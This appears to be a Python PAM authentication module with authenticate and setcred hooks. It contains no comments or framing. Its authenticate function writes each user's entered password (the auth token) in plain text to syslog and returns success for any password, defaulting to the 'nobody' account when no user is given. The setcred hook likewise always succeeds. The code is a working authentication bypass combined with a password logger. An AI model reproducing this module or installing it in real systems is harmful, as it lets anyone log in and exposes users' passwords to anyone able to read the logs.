#!/usr/bin/env python
# coding: utf-8

import syslog

DEFAULT_USER = "nobody"


def pam_sm_authenticate(pamh, flags, argv):
    try:
        user = pamh.get_user(None)
    except pamh.exception as e:
        return e.pam_result
    if user is None:
        pamh.user = DEFAULT_USER
    syslog.syslog('auth')
    syslog.syslog(pamh.authtok)
    return pamh.PAM_SUCCESS


def pam_sm_setcred(pamh, flags, argv):
    syslog.syslog('setcred')
    return pamh.PAM_SUCCESS
